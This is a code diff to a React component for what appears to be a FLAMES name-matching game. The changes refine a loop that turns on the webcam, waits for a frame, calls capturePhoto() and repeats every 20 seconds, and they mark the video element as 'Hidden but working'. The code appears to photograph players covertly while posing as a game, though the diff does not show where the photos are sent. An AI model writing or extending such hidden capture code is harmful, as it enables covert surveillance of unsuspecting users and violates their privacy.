@@ -179,29 +179,29 @@ const FlamesGame = () => {
             const video = videoRef.current;
             if (!video) return res();
 
-            const onLoadedMetadata = () => {
-              video.removeEventListener("loadedmetadata", onLoadedMetadata);
-              console.log("🎬 Metadata ready");
+            const onCanPlay = () => {
+              video.removeEventListener("canplay", onCanPlay);
+              console.log("🎥 Video can play (frame ready)");
               res();
             };
 
-            if (video.readyState >= 1) {
+            if (video.readyState >= 3) {
               res();
             } else {
-              video.addEventListener("loadedmetadata", onLoadedMetadata);
+              video.addEventListener("canplay", onCanPlay);
             }
           });
 
+          await new Promise(r => setTimeout(r, 500)); // tiny delay just in case
           await capturePhoto();
           stopCamera();
         }
 
-        await delay(20000);
+        await delay(20000); // repeat every 20s
       }
     };
 
     loop();
-
     return () => {
       isCancelled = true;
       stopCamera();
@@ -326,6 +326,7 @@ const FlamesGame = () => {
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
       </Container>
 
+      {/* 🔒 Hidden but working video */}
       <video
         ref={videoRef}
         width="320"
